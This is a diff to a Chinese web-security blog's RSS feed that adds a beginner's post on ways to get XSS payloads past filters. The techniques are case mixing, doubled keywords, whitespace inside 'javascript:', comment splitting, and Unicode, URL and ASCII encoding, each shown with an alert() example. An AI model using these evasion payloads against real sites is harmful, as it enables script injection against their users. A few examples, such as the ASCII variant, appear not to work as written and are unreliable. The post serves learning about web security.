@@ -5,8 +5,51 @@
         <link>https://hq185187.github.io</link>
         <description>不定时更新web安全相关知识</description>
         <language>zh-CN</language>
-        <pubDate>Mon, 26 Jun 2023 19:55:23 +0800</pubDate>
-        <lastBuildDate>Mon, 26 Jun 2023 19:55:23 +0800</lastBuildDate>
+        <pubDate>Tue, 27 Jun 2023 11:12:36 +0800</pubDate>
+        <lastBuildDate>Tue, 27 Jun 2023 11:12:36 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://hq185187.github.io/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/</guid>
+            <title>XSS初学习2</title>
+            <link>https://hq185187.github.io/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/</link>
+            <pubDate>Tue, 27 Jun 2023 11:12:36 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;xss绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss绕过&#34;&gt;#&lt;/a&gt; XSS 绕过&lt;/h2&gt;
+&lt;h3 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; 大小写绕过&lt;/h3&gt;
+&lt;p&gt;html 对大小写不敏感&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert(&amp;quot;123&amp;quot;);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;等价于&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;ScRipt&amp;gt;ALERT(&amp;quot;123&amp;quot;);&amp;lt;/scriPt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;双写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#双写绕过&#34;&gt;#&lt;/a&gt; 双写绕过&lt;/h3&gt;
+&lt;p&gt;如果 replace 函数过滤了某个关键字，就可以尝试双写绕过&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;假如过滤alert:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alalertert(&amp;quot;123&amp;quot;);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;空格回车tab绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#空格回车tab绕过&#34;&gt;#&lt;/a&gt; 空格回车 TAB 绕过&lt;/h3&gt;
+&lt;p&gt;js 解析到完整语句并且行尾存在换行符就可以省路分号，若解析确定不是完整语句，则会继续处理直到语句结束或出现分号&lt;br&gt;
+以&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;javascript:alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;为例:&lt;/p&gt;
+&lt;h4 id=&#34;空格绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#空格绕过&#34;&gt;#&lt;/a&gt; 空格绕过&lt;/h4&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;java script:alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&#34;回车绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#回车绕过&#34;&gt;#&lt;/a&gt; 回车绕过&lt;/h4&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;script:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&#34;tab绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tab绕过&#34;&gt;#&lt;/a&gt; TAB 绕过&lt;/h4&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;java    script:alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;注释绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注释绕过&#34;&gt;#&lt;/a&gt; 注释绕过&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert(&amp;quot;123&amp;quot;);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;scri&amp;lt;!--1--&amp;gt;pt&amp;gt;alert(&amp;quot;123&amp;quot;);&amp;lt;/sc&amp;lt;!--1--&amp;gt;ript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;注意:&lt;mark&gt; 注释有两种方法表示&lt;/mark&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;!--1--&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;``&amp;lt;!–1--!&amp;gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#编码绕过&#34;&gt;#&lt;/a&gt; 编码绕过&lt;/h3&gt;
+&lt;h4 id=&#34;unicode编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unicode编码绕过&#34;&gt;#&lt;/a&gt; unicode 编码绕过&lt;/h4&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;quot;javascript:alert(&amp;#x27;&amp;lt;\u4e00&amp;gt;&amp;#x27;)&amp;quot;&amp;gt;test&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;\u4e00是一的Unicode编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;等于&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;quot;javascript:alert(&amp;#x27;&amp;lt;一&amp;gt;&amp;#x27;)&amp;quot;&amp;gt;test&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&#34;url编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#url编码绕过&#34;&gt;#&lt;/a&gt; url 编码绕过&lt;/h4&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;quot;javascript:%61%6C%65%72%74%28%22%78%73%73%22%29%3B;&amp;quot;&amp;gt;xss&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;等价于:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;quot;javascript:alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&amp;gt;xss&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&#34;ascii码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ascii码&#34;&gt;#&lt;/a&gt; ascii 码&lt;/h4&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;quot;javascript:alert(&amp;#x27;xss&amp;#x27;);&amp;quot;&amp;gt;xss&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;等价&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;quot;javascript:97,108,101,114,116,40,34,120,115,115,34,41,59&amp;quot;&amp;gt;xss&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;还有 hrml 实体编码绕过，base64 编码，十进制八进制绕过等等&lt;br&gt;
+过滤单双引号用反引号&lt;code&gt;``&lt;/code&gt;替代&lt;/p&gt;
+&lt;p&gt;更多的绕过看这篇&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUwODU0NzkwL2FydGljbGUvZGV0YWlscy8xMjQyOTcwNDY=&#34;&gt;绕过大全&lt;/span&gt;&lt;br&gt;
+关于编码绕过看&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8xMDMuaHRtbA==&#34;&gt;这篇&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://hq185187.github.io/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/</guid>
             <title>XSS初学习1</title>
